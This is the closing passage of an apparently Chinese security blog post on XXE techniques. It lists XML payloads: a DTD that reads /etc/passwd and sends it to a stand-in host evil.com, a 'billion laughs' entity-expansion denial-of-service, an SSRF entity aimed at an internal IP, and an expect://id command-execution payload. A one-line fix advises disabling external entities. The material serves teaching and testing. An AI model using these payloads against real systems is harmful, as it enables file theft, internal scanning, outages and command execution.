</span></span><span class=line><span class=cl>]&gt;
</span></span><span class=line><span class=cl><span class=nt>&lt;foo/&gt;</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-dtd data-lang=dtd><span class=line><span class=cl><span class=k>&lt;!ENTITY</span> <span class=ni>%</span> <span class=ni>file</span> <span class=kc>SYSTEM</span> <span class=s2>&#34;file:///etc/passwd&#34;</span><span class=k>&gt;</span>
</span></span><span class=line><span class=cl><span class=k>&lt;!ENTITY</span> <span class=ni>%</span> <span class=ni>def</span> <span class=s2>&#34;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://evil.com/?data=%file;&#39;&gt;&#34;</span><span class=k>&gt;</span>
</span></span><span class=line><span class=cl><span class=ni>%def;</span> <span class=ni>%send;</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=ddos>DDoS</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE foo [
</span></span></span><span class=line><span class=cl><span class=cp>    &lt;!ENTITY dos &#34;dos&#34;&gt;</span>
</span></span><span class=line><span class=cl>    <span class=cp>&lt;!ENTITY dos1 &#34;&amp;dos;&amp;dos;&amp;dos;&amp;dos;&amp;dos;&#34;&gt;</span>
</span></span><span class=line><span class=cl>    <span class=cp>&lt;!ENTITY dos2 &#34;&amp;dos1;&amp;dos1;&amp;dos1;&amp;dos1;&amp;dos1;&#34;&gt;</span>
</span></span><span class=line><span class=cl>    <span class=cp>&lt;!ENTITY xxe &#34;&amp;dos2;&amp;dos2;&amp;dos2;&amp;dos2;&amp;dos2;&#34;&gt;</span>
</span></span><span class=line><span class=cl>]&gt;
</span></span><span class=line><span class=cl><span class=nt>&lt;foo&gt;</span><span class=ni>&amp;xxe;</span><span class=nt>&lt;/foo&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=ssrfinclude>ssrf\include</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE foo [
</span></span></span><span class=line><span class=cl><span class=cp>    &lt;!ENTITY xxe SYSTEM &#34;http://192.168.1.1:8080/&#34;&gt;</span>
</span></span><span class=line><span class=cl>]&gt;
</span></span><span class=line><span class=cl><span class=nt>&lt;foo&gt;</span><span class=ni>&amp;xxe;</span><span class=nt>&lt;/foo&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=rce>RCE</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34;?&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY xxe SYSTEM &#34;expect://id&#34; &gt;</span>]&gt;
</span></span><span class=line><span class=cl><span class=nt>&lt;catalog&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;core</span> <span class=na>id=</span><span class=s>&#34;test101&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;description&gt;</span><span class=ni>&amp;xxe;</span><span class=nt>&lt;/description&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;/core&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/catalog&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=fix>fix</h2><p>直接禁用外部实体加载即可，或者是bypass这方面多点关键词</p><h1 id=0x03-小结>0x03 小结</h1><p>这篇文章我本人觉得写的很烂，因为并没有从代码中去实际的探寻其中的奥秘，而且网上参考资料也很少，所以这里给十月的我立一个<strong>flag</strong>，从某个CVE中再度解析<code>xxe</code></p><h1 id=0x04-reference>0x04 reference</h1><p>网上的大部分文章都有看，感谢师傅们！</p></section><footer class=article-footer><section class=article-tags><a href=/tags/xxe/>Xxe</a>
<a href=/tags/%E5%A7%BF%E5%8A%BF/>姿势</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
2024 -
2026 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 430.4k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>